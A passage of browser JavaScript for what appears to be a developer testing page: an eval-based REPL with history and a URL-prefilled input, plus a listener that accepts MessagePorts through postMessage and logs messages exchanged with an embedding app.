      const oldLog = console.log;
      console.log = (...args) => {
        appendLineToOutput(args.join(' '), BLUE);
        oldLog(...args);
      };

      window.onerror = (message, source, lineno, colno, error) => {
        appendLineToOutput(`Error: ${message} at ${source}:${lineno}:${colno}`, RED);
        if(error) {
          appendLineToOutput(error.stack, RED);
        }
        return true;
      };

      function runCode(code) {
        // Print the command line with >>>
        const commandLine = document.createElement('div');
        commandLine.textContent = '>>> ' + code;
        commandLine.style.cursor = 'pointer';
        commandLine.addEventListener('click', () => {
          textarea.value = code;
          adjustTextareaHeight();
          textarea.focus();
        });
        output.appendChild(commandLine);

        // Temporarily override console.log


        let errorOccurred = false;
        try {
          const result = eval(code);
          if (!errorOccurred) {
            appendLineToOutput(String(result), GREEN);
          }
        } catch (err) {
          errorOccurred = true;
          appendLineToOutput('Error: ' + err, RED);
        } finally {
          // Restore original console.log
        }

        // Scroll to bottom
        output.scrollTop = output.scrollHeight;
        inputLine.scrollIntoView(false);

        // Add to history
        history.push(code);
        historyIndex = history.length;
        // Clear the textarea
        textarea.value = '';
        adjustTextareaHeight();
      }

      function adjustTextareaHeight() {
        textarea.style.height = 'auto';
        textarea.style.height = textarea.scrollHeight + 'px';
      }

      textarea.addEventListener('input', () => {
        adjustTextareaHeight();
      });

      textarea.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          if (!e.shiftKey && !e.ctrlKey) {
            e.preventDefault();
            const code = textarea.value.trim();
            if (code) {
              runCode(code);
            }
          }
        } else if (e.key === 'ArrowUp') {
          // Move up in history
          if (history.length > 0) {
            e.preventDefault();
            if (historyIndex > 0) {
              historyIndex--;
            }
            textarea.value = history[historyIndex] || '';
            adjustTextareaHeight();
          }
        } else if (e.key === 'ArrowDown') {
          // Move down in history
          if (history.length > 0) {
            e.preventDefault();
            if (historyIndex < history.length) {
              historyIndex++;
            }
            textarea.value = history[historyIndex] || '';
            adjustTextareaHeight();
          }
        }

      });
    const params = new URLSearchParams(window.location.search);
    const value = params.get('js');
    if (value && value.trim() !== '') {
      textarea.value = value;

    }
  }

  setupJSEvalShell(vars_el);

  let ports = []; // Array to hold port info: {port, headerEl, containerEl}
  let portCount = 0;

  window.addEventListener("message", function (event) {
    // Check if we got any ports
    if (!event.ports || event.ports.length === 0) return;
    const port = event.ports[0];
    if(ports.find(p =>  p === port )) return;

    // If we haven't seen this port yet, create a section for it.
    // This code assumes each message event that includes a port is a "new" port.
    // If you may receive multiple events with the same port, you need a check.
    const portIndex = portCount++;

    // Create a new header for this port
    const portHeader = header(`Port#${portIndex + 1} Post Messages\n[origin:${event.origin||'null'}]`, BLUE);
    const portContainer = document.createElement('div');
    portContainer.style.display = 'block';
    portContainer.style.margin = '5px';


    function postMessagtToApp(msg) {
      const msgDiv = document.createElement('div');
      msgDiv.style.fontFamily = 'monospace';
      msgDiv.textContent = `[web] ${msg}`;
      portContainer.appendChild(msgDiv);
      port.postMessage(msg);
    }

    portHeader.onclick = () => {
      postMessagtToApp(JSON.stringify({message: 'Hello from the website!'}))
    };

    mainDiv.appendChild(portHeader);
    mainDiv.appendChild(portContainer);

    // Store the port and its UI elements
    ports.push(port);

    postMessagtToApp(JSON.stringify({message: 'Hello from the website!'}))

    // Set up receiving messages from this port
    port.onmessage = function(event) {
      // event.data contains the message
      // Create a div for the received message
      const msgDiv = document.createElement('div');
      msgDiv.style.fontFamily = 'monospace';
      // try catch JSON parse event.data
      try {
        msgDiv.textContent = `[app] ${JSON.stringify(JSON.parse(event.data), null, 2)}`;
      } catch(e) {
        msgDiv.textContent = `[app] ${event.data}`;
      }

      portContainer.appendChild(msgDiv);
    };
  });


})();